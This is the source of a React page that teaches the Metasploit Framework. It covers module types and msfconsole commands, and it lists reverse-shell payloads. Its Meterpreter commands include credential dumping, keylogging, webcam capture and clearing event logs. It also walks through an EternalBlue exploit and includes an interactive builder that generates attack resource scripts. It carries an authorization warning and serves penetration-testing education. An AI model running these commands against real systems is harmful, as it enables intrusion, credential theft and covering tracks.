'use client'

import { useState, useEffect } from 'react';
import DocHeading from '@/components/base/DocHeading';
import Callout from '@/components/base/Callout';
import CodeBlock from '@/components/base/Codeblock';
import InlineCode from '@/components/base/InlineCode';
import { motion } from 'framer-motion';

const fadeUp = {
  hidden: { opacity: 0, y: 24 },
  visible: { opacity: 1, y: 0 },
};

const moduleTypes = [
  { type: 'exploit', name: 'Exploit', color: 'text-cyber-red', desc: 'Code that takes advantage of a vulnerability to gain control of a target.' },
  { type: 'payload', name: 'Payload', color: 'text-cyber-amber', desc: 'Code that executes after a successful exploit — reverse shell, meterpreter, etc.' },
  { type: 'auxiliary', name: 'Auxiliary', color: 'text-cyber-cyan', desc: 'Scanner, fuzzer, or DoS tool that does not directly exploit vulnerabilities.' },
  { type: 'post', name: 'Post-Exploitation', color: 'text-cyber-green', desc: 'Modules for actions after compromise — hashdump, keylogging, persistence.' },
  { type: 'encoder', name: 'Encoder', color: 'text-cyber-text-muted', desc: 'Transforms payloads to evade antivirus and signature detection.' },
  { type: 'nop', name: 'NOP', color: 'text-cyber-text-muted', desc: 'No-operation sled for buffer overflow exploits to ensure reliable payload execution.' },
  { type: 'evasion', name: 'Evasion', color: 'text-cyber-amber', desc: 'Advanced anti-virus evasion beyond simple encoders.' },
];

const essentialCommands = [
  { cmd: 'search', desc: 'Search for modules by name or keyword', example: "search ms17_010" },
  { cmd: 'use', desc: 'Select a module for use', example: "use exploit/windows/smb/ms17_010_eternalblue" },
  { cmd: 'info', desc: 'Show detailed information about the selected module', example: "info" },
  { cmd: 'show options', desc: 'Display required and optional parameters', example: "show options" },
  { cmd: 'set', desc: 'Assign a value to a module option', example: "set RHOSTS 192.168.1.10" },
  { cmd: 'unset', desc: 'Remove a value from a module option', example: "unset RHOSTS" },
  { cmd: 'setg', desc: 'Set a global option value', example: "setg LHOST 10.0.0.1" },
  { cmd: 'exploit', desc: 'Run the selected exploit module', example: "exploit" },
  { cmd: 'run', desc: 'Run the selected auxiliary or post module', example: "run" },
  { cmd: 'check', desc: 'Check if target is vulnerable (not all modules support this)', example: "check" },
  { cmd: 'back', desc: 'Return to the main prompt without the module selected', example: "back" },
  { cmd: 'sessions', desc: 'List active sessions', example: "sessions -l" },
  { cmd: 'sessions -i', desc: 'Interact with a specific session', example: "sessions -i 1" },
  { cmd: 'jobs', desc: 'List running background jobs', example: "jobs" },
  { cmd: 'workspace', desc: 'Manage database workspaces', example: "workspace -a pentest" },
  { cmd: 'hosts', desc: 'List scanned hosts in the database', example: "hosts" },
  { cmd: 'services', desc: 'List services discovered on scanned hosts', example: "services" },
  { cmd: 'vulns', desc: 'List discovered vulnerabilities in the database', example: "vulns" },
  { cmd: 'db_nmap', desc: 'Run nmap and import results into the database', example: "db_nmap -sS 10.0.0.0/24" },
  { cmd: 'save', desc: 'Save current settings to a configuration file', example: "save" },
  { cmd: 'load', desc: 'Load a plugin', example: "load wmap" },
];

const payloads = [
  { name: 'meterpreter/reverse_tcp', type: 'Windows', desc: 'Meterpreter over TCP reverse shell. Feature-rich with built-in commands.' },
  { name: 'meterpreter/reverse_https', type: 'Windows', desc: 'Meterpreter over HTTPS reverse shell. Blends with normal HTTPS traffic.' },
  { name: 'windows/shell/reverse_tcp', type: 'Windows', desc: 'Basic Windows command shell via TCP reverse connection.' },
  { name: 'linux/x86/shell/reverse_tcp', type: 'Linux', desc: 'Linux x86 command shell via TCP reverse connection.' },
  { name: 'linux/x64/meterpreter/reverse_tcp', type: 'Linux', desc: 'Linux x64 Meterpreter reverse TCP shell.' },
  { name: 'php/meterpreter/reverse_tcp', type: 'Web', desc: 'PHP Meterpreter reverse TCP shell for web servers.' },
  { name: 'java/jsp_shell_reverse_tcp', type: 'Java', desc: 'JSP reverse shell for Java web applications.' },
  { name: 'android/meterpreter/reverse_tcp', type: 'Android', desc: 'Android Meterpreter reverse TCP payload.' },
  { name: 'python/shell_reverse_tcp', type: 'Python', desc: 'Python-based reverse shell over TCP.' },
  { name: 'cmd/unix/reverse_python', type: 'Unix', desc: 'Unix command shell delivered via Python script.' },
];

const meterpreterCommands = [
  { cmd: 'sysinfo', desc: 'Display system information (OS, architecture, hostname)' },
  { cmd: 'getuid', desc: 'Show current user ID' },
  { cmd: 'ps', desc: 'List running processes' },
  { cmd: 'migrate', desc: 'Migrate to another process for stability or privilege evasion' },
  { cmd: 'shell', desc: 'Drop into a system shell' },
  { cmd: 'background', desc: 'Background the session and return to msfconsole' },
  { cmd: 'download', desc: 'Download a file from the target' },
  { cmd: 'upload', desc: 'Upload a file to the target' },
  { cmd: 'search', desc: 'Search for files on the target filesystem' },
  { cmd: 'hashdump', desc: 'Dump password hashes (Windows SAM database)' },
  { cmd: 'keyscan_start', desc: 'Start keylogger' },
  { cmd: 'keyscan_dump', desc: 'Dump captured keystrokes' },
  { cmd: 'screenshot', desc: 'Capture target screen image' },
  { cmd: 'webcam_snap', desc: 'Capture image from target webcam' },
  { cmd: 'portfwd', desc: 'Create port forwarding through the session' },
  { cmd: 'route', desc: 'Add routing for pivoting through the compromised host' },
  { cmd: 'load kiwi', desc: 'Load Mimikatz module for credential extraction' },
  { cmd: 'lsa_dump_secrets', desc: 'Dump LSA secrets including cached credentials' },
  { cmd: 'getsystem', desc: 'Attempt to elevate to SYSTEM privileges' },
  { cmd: 'clearev', desc: 'Clear Windows event logs' },
];

const databaseSetup = [
  { step: '1', title: 'Start PostgreSQL', cmd: 'sudo systemctl start postgresql' },
  { step: '2', title: 'Initialize Database', cmd: 'sudo msfdb init' },
  { step: '3', title: 'Launch msfconsole', cmd: 'msfconsole' },
  { step: '4', title: 'Verify Connection', cmd: 'db_status' },
];

const exploitWorkflow = [
  { step: 'search', desc: 'Find an exploit matching the target vulnerability', example: "search ms17_010" },
  { step: 'use', desc: 'Select the exploit module', example: "use exploit/windows/smb/ms17_010_eternalblue" },
  { step: 'show options', desc: 'Review required and optional parameters', example: "show options" },
  { step: 'set RHOSTS', desc: 'Set the target host or range', example: "set RHOSTS 192.168.1.10" },
  { step: 'set LHOST', desc: 'Set your local listener IP', example: "set LHOST 10.0.0.1" },
  { step: 'set LPORT', desc: 'Set your local listener port', example: "set LPORT 4444" },
  { step: 'set PAYLOAD', desc: 'Choose a payload (optional, auto-selected by default)', example: "set PAYLOAD windows/meterpreter/reverse_tcp" },
  { step: 'exploit', desc: 'Execute the exploit', example: "exploit" },
];

export default function MetasploitPage() {
  const [activeModule, setActiveModule] = useState<string | null>(null);
  const [builderRhost, setBuilderRhost] = useState('192.168.1.10');
  const [builderLhost, setBuilderLhost] = useState('10.0.0.1');
  const [builderLport, setBuilderLport] = useState('4444');
  const [builderPayload, setBuilderPayload] = useState('windows/meterpreter/reverse_tcp');
  const [builderExploit, setBuilderExploit] = useState('exploit/windows/smb/ms17_010_eternalblue');
  const [builderTarget, setBuilderTarget] = useState('0');
  const [copied, setCopied] = useState(false);
  const [activeStep, setActiveStep] = useState<number | null>(null);

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  const generatedScript = `${builderExploit}
set RHOSTS ${builderRhost}
set LHOST ${builderLhost}
set LPORT ${builderLport}
set PAYLOAD ${builderPayload}
set TARGET ${builderTarget}
exploit`;

  const copyScript = () => {
    navigator.clipboard.writeText(generatedScript);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
      <div className="px-6 md:px-12 lg:px-16 py-10 max-w-5xl">
        {/* Header */}
        <motion.div initial="hidden" animate="visible" variants={fadeUp} transition={{ duration: 0.5 }}>
          <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-cyber-amber/10 border border-cyber-amber/20 text-cyber-amber text-xs font-medium font-mono mb-4">
            <i className="ri-fire-line" />
            Penetration Testing Framework
          </div>
          <DocHeading level={1}>Metasploit Framework</DocHeading>
          <p className="text-cyber-text-muted leading-relaxed mt-3">
            <strong className="text-white">Metasploit Framework</strong> is the world&apos;s most widely used penetration testing framework.
            It provides a comprehensive environment for developing, testing, and executing exploit code against remote targets.
            Originally created by H.D. Moore in 2003, it is now maintained by Rapid7 and includes thousands of exploits, payloads, and post-exploitation modules.
          </p>
        </motion.div>

        {/* What is Metasploit */}
        <motion.section className="mt-10" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp} transition={{ duration: 0.5 }}>
          <DocHeading level={2} id="overview">What is Metasploit</DocHeading>
          <div className="mt-4 grid grid-cols-1 sm:grid-cols-2 gap-3">
            {[
              'Modular exploit framework',
              'Automated vulnerability exploitation',
              'Built-in payload generation',
              'Post-exploitation modules',
              'Meterpreter advanced payload',
              'Database-backed workspace management',
              'Armitage GUI frontend',
              'Community and Pro editions',
            ].map((item, i) => (
              <div key={i} className="flex items-center gap-2.5 text-sm text-cyber-text-muted">
                <span className="w-1.5 h-1.5 rounded-full bg-cyber-amber flex-shrink-0" />
                {item}
              </div>
            ))}
          </div>
        </motion.section>

        <Callout type="danger" className="mt-6">
          Metasploit is a powerful offensive security tool. Only use it against systems you own or have explicit written authorization to test. Unauthorized use is illegal.
        </Callout>

        {/* Installation */}
        <motion.section className="mt-10" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp} transition={{ duration: 0.5 }}>
          <DocHeading level={2} id="installation">Installation</DocHeading>
          <div className="mt-4 space-y-4">
            <div>
              <h4 className="text-sm font-semibold text-white mb-2">Kali Linux (pre-installed)</h4>
              <CodeBlock code="msfconsole --version" />
            </div>
            <div>
              <h4 className="text-sm font-semibold text-white mb-2">Linux (apt)</h4>
              <CodeBlock code="sudo apt update && sudo apt install metasploit-framework" />
            </div>
            <div>
              <h4 className="text-sm font-semibold text-white mb-2">macOS (Homebrew)</h4>
              <CodeBlock code="brew install metasploit" />
            </div>
            <div>
              <h4 className="text-sm font-semibold text-white mb-2">From Source</h4>
              <CodeBlock code={"git clone https://github.com/rapid7/metasploit-framework.git\ncd metasploit-framework\nbundle install\n./msfconsole"} />
            </div>
            <div>
              <h4 className="text-sm font-semibold text-white mb-2">Update Framework</h4>
              <CodeBlock code={"msfconsole\nmsf6 > apt update  # or use msfupdate script"} />
            </div>
          </div>
        </motion.section>

        {/* Module Types */}
        <motion.section className="mt-10" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp} transition={{ duration: 0.5 }}>
          <DocHeading level={2} id="modules">Module Types</DocHeading>
          <p className="text-cyber-text-muted leading-relaxed mt-3">
            Metasploit is built around a modular architecture. Understanding each module type is essential for effective use.
          </p>
          <div className="mt-4 grid grid-cols-1 md:grid-cols-2 gap-3">
            {moduleTypes.map((m) => (
              <button
                key={m.type}
                type="button"
                onClick={() => setActiveModule(activeModule === m.type ? null : m.type)}
                className={`cyber-card p-4 text-left cursor-pointer ${activeModule === m.type ? 'border-cyber-amber' : ''}`}
              >
                <div className="flex items-start gap-3">
                  <span className={`w-8 h-8 rounded-lg bg-cyber-bg flex items-center justify-center flex-shrink-0 ${m.color}`}>
                    <i className="ri-box-3-line text-lg" />
                  </span>
                  <div>
                    <h4 className={`text-sm font-semibold ${m.color}`}>{m.name}</h4>
                    <p className="text-xs text-cyber-text-muted mt-1">{m.desc}</p>
                  </div>
                </div>
              </button>
            ))}
          </div>
        </motion.section>

        {/* Essential Commands */}
        <motion.section className="mt-10" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp} transition={{ duration: 0.5 }}>
          <DocHeading level={2} id="commands">Essential msfconsole Commands</DocHeading>
          <div className="mt-4 grid grid-cols-1 md:grid-cols-2 gap-2">
            {essentialCommands.map((c) => (
              <div key={c.cmd} className="flex items-start gap-3 p-3 rounded-lg bg-cyber-bg-card/50 border border-cyber-border">
                <span className="font-mono text-xs px-2 py-1 rounded bg-cyber-bg border border-cyber-border text-cyber-amber flex-shrink-0 whitespace-nowrap">{c.cmd}</span>
                <div>
                  <span className="text-sm text-cyber-text-muted">{c.desc}</span>
                  <code className="block text-xs font-mono text-cyber-green mt-1">{c.example}</code>
                </div>
              </div>
            ))}
          </div>
        </motion.section>

        {/* Payloads */}
        <motion.section className="mt-10" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp} transition={{ duration: 0.5 }}>
          <DocHeading level={2} id="payloads">Common Payloads</DocHeading>
          <p className="text-cyber-text-muted leading-relaxed mt-3">
            Payloads determine what happens after a successful exploit. Choose the right one for your target OS and network conditions.
          </p>
          <div className="mt-4 grid grid-cols-1 md:grid-cols-2 gap-3">
            {payloads.map((p) => (
              <div key={p.name} className="cyber-card p-4">
                <div className="flex items-center gap-2 mb-1.5">
                  <span className="text-xs px-2 py-0.5 rounded bg-cyber-bg border border-cyber-border text-cyber-text-dim">{p.type}</span>
                </div>
                <code className="text-xs font-mono text-cyber-cyan">{p.name}</code>
                <p className="text-xs text-cyber-text-muted mt-1">{p.desc}</p>
              </div>
            ))}
          </div>
        </motion.section>

        {/* Meterpreter */}
        <motion.section className="mt-10" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp} transition={{ duration: 0.5 }}>
          <DocHeading level={2} id="meterpreter">Meterpreter Commands</DocHeading>
          <p className="text-cyber-text-muted leading-relaxed mt-3">
            Meterpreter is Metasploit&apos;s advanced payload that provides an interactive shell with many built-in commands.
            It runs entirely in memory, making it harder to detect.
          </p>
          <div className="mt-4 grid grid-cols-1 md:grid-cols-2 gap-2">
            {meterpreterCommands.map((c) => (
              <div key={c.cmd} className="flex items-start gap-3 p-3 rounded-lg bg-cyber-bg-card/50 border border-cyber-border">
                <span className="font-mono text-xs px-2 py-1 rounded bg-cyber-bg border border-cyber-border text-cyber-green flex-shrink-0">{c.cmd}</span>
                <span className="text-sm text-cyber-text-muted">{c.desc}</span>
              </div>
            ))}
          </div>
          <Callout type="tip" className="mt-4">
            Use <InlineCode>background</InlineCode> to return to msfconsole while keeping your Meterpreter session alive. Then use <InlineCode>sessions -i ID</InlineCode> to return.
          </Callout>
        </motion.section>

        {/* Database Setup */}
        <motion.section className="mt-10" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp} transition={{ duration: 0.5 }}>
          <DocHeading level={2} id="database">Database Setup</DocHeading>
          <p className="text-cyber-text-muted leading-relaxed mt-3">
            Metasploit uses PostgreSQL to store scan results, hosts, services, and vulnerabilities. Setting it up enables powerful features like <InlineCode>db_nmap</InlineCode> and workspace management.
          </p>
          <div className="mt-4 space-y-3">
            {databaseSetup.map((s) => (
              <div key={s.step}>
                <h4 className="text-sm font-semibold text-white mb-2">Step {s.step}: {s.title}</h4>
                <CodeBlock code={s.cmd} />
              </div>
            ))}
          </div>
        </motion.section>

        {/* Exploit Workflow */}
        <motion.section className="mt-10" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp} transition={{ duration: 0.5 }}>
          <DocHeading level={2} id="workflow">Exploit Workflow</DocHeading>
          <p className="text-cyber-text-muted leading-relaxed mt-3">
            Click each step to see the exact command sequence for a typical exploit.
          </p>
          <div className="mt-4 space-y-3">
            {exploitWorkflow.map((step, i) => (
              <button
                key={i}
                type="button"
                onClick={() => setActiveStep(activeStep === i ? null : i)}
                className={`w-full cyber-card p-4 text-left cursor-pointer ${activeStep === i ? 'border-cyber-amber' : ''}`}
              >
                <div className="flex items-start gap-3">
                  <span className="w-7 h-7 rounded-full bg-cyber-amber/10 border border-cyber-amber/20 text-cyber-amber text-xs font-bold flex items-center justify-center flex-shrink-0">
                    {i + 1}
                  </span>
                  <div className="flex-1">
                    <h4 className="text-sm font-semibold text-white">{step.step}: {step.desc}</h4>
                    {activeStep === i && (
                      <motion.code
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        className="block mt-2 text-xs font-mono text-cyber-green"
                      >
                        {step.example}
                      </motion.code>
                    )}
                  </div>
                  <i className={`ri-arrow-down-s-line text-cyber-text-dim transition-transform ${activeStep === i ? 'rotate-180' : ''}`} />
                </div>
              </button>
            ))}
          </div>
        </motion.section>

        {/* Interactive Exploit Builder */}
        <motion.section className="mt-10" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp} transition={{ duration: 0.5 }}>
          <DocHeading level={2} id="builder">Interactive Exploit Script Builder</DocHeading>
          <p className="text-cyber-text-muted leading-relaxed mt-3">
            Configure your exploit parameters and copy the generated msfconsole resource script.
          </p>
          <div className="mt-5 cyber-card p-5 md:p-6">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
              <div>
                <label className="text-sm font-semibold text-white block mb-2">Exploit Module</label>
                <input
                  type="text"
                  value={builderExploit}
                  onChange={(e) => setBuilderExploit(e.target.value)}
                  className="w-full bg-cyber-bg border border-cyber-border rounded-lg px-3 py-2 text-sm text-cyber-text font-mono focus:outline-none focus:border-cyber-amber"
                  placeholder="exploit/windows/smb/ms17_010_eternalblue"
                />
              </div>
              <div>
                <label className="text-sm font-semibold text-white block mb-2">Target Index (optional)</label>
                <input
                  type="text"
                  value={builderTarget}
                  onChange={(e) => setBuilderTarget(e.target.value)}
                  className="w-full bg-cyber-bg border border-cyber-border rounded-lg px-3 py-2 text-sm text-cyber-text font-mono focus:outline-none focus:border-cyber-amber"
                  placeholder="0"
                />
              </div>
            </div>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
              <div>
                <label className="text-sm font-semibold text-white block mb-2">RHOSTS (Target)</label>
                <input
                  type="text"
                  value={builderRhost}
                  onChange={(e) => setBuilderRhost(e.target.value)}
                  className="w-full bg-cyber-bg border border-cyber-border rounded-lg px-3 py-2 text-sm text-cyber-text font-mono focus:outline-none focus:border-cyber-amber"
                  placeholder="192.168.1.10"
                />
              </div>
              <div>
                <label className="text-sm font-semibold text-white block mb-2">LHOST (Your IP)</label>
                <input
                  type="text"
                  value={builderLhost}
                  onChange={(e) => setBuilderLhost(e.target.value)}
                  className="w-full bg-cyber-bg border border-cyber-border rounded-lg px-3 py-2 text-sm text-cyber-text font-mono focus:outline-none focus:border-cyber-amber"
                  placeholder="10.0.0.1"
                />
              </div>
            </div>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-5">
              <div>
                <label className="text-sm font-semibold text-white block mb-2">LPORT</label>
                <input
                  type="text"
                  value={builderLport}
                  onChange={(e) => setBuilderLport(e.target.value)}
                  className="w-full bg-cyber-bg border border-cyber-border rounded-lg px-3 py-2 text-sm text-cyber-text font-mono focus:outline-none focus:border-cyber-amber"
                  placeholder="4444"
                />
              </div>
              <div>
                <label className="text-sm font-semibold text-white block mb-2">Payload</label>
                <select
                  value={builderPayload}
                  onChange={(e) => setBuilderPayload(e.target.value)}
                  className="w-full bg-cyber-bg border border-cyber-border rounded-lg px-3 py-2 text-sm text-cyber-text focus:outline-none focus:border-cyber-amber"
                >
                  <option value="windows/meterpreter/reverse_tcp">windows/meterpreter/reverse_tcp</option>
                  <option value="windows/meterpreter/reverse_https">windows/meterpreter/reverse_https</option>
                  <option value="windows/shell/reverse_tcp">windows/shell/reverse_tcp</option>
                  <option value="linux/x64/meterpreter/reverse_tcp">linux/x64/meterpreter/reverse_tcp</option>
                  <option value="linux/x86/shell/reverse_tcp">linux/x86/shell/reverse_tcp</option>
                  <option value="php/meterpreter/reverse_tcp">php/meterpreter/reverse_tcp</option>
                  <option value="android/meterpreter/reverse_tcp">android/meterpreter/reverse_tcp</option>
                  <option value="python/shell_reverse_tcp">python/shell_reverse_tcp</option>
                </select>
              </div>
            </div>
            <div className="bg-cyber-bg border border-cyber-border rounded-lg p-4">
              <div className="flex items-center justify-between mb-2">
                <span className="text-xs font-semibold text-cyber-amber">Resource Script</span>
                <button
                  type="button"
                  onClick={copyScript}
                  className="text-xs text-cyber-cyan hover:text-cyber-cyan-dim transition-colors flex items-center gap-1"
                >
                  <i className={copied ? 'ri-check-line' : 'ri-file-copy-line'} />
                  {copied ? 'Copied!' : 'Copy'}
                </button>
              </div>
              <pre className="text-sm font-mono text-cyber-green whitespace-pre-wrap">{generatedScript}</pre>
            </div>
            <p className="text-xs text-cyber-text-dim mt-2">
              Save to a file and run with: <code className="text-cyber-cyan font-mono">msfconsole -r exploit.rc</code>
            </p>
          </div>
        </motion.section>

        {/* Tips */}
        <motion.section className="mt-10 mb-16" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp} transition={{ duration: 0.5 }}>
          <DocHeading level={2} id="tips">Pro Tips</DocHeading>
          <div className="mt-4 space-y-3">
            <Callout type="tip">Always verify target scope before running exploits. A single wrong RHOSTS can cause unintended damage.</Callout>
            <Callout type="info">Use <InlineCode>db_nmap</InlineCode> to scan and automatically import results into Metasploit&apos;s database for easy target selection.</Callout>
            <Callout type="tip">Set <InlineCode>setg LHOST</InlineCode> once at the start of your session so you never forget it in individual modules.</Callout>
            <Callout type="warning">Never expose Metasploit listener ports to the public internet without proper firewall rules. Set <InlineCode>LHOST</InlineCode> to your VPN or internal IP.</Callout>
            <Callout type="info">Use <InlineCode>sessions -K</InlineCode> to kill all active sessions and <InlineCode>jobs -K</InlineCode> to stop all background jobs when done.</Callout>
          </div>
        </motion.section>
      </div>
  );
}
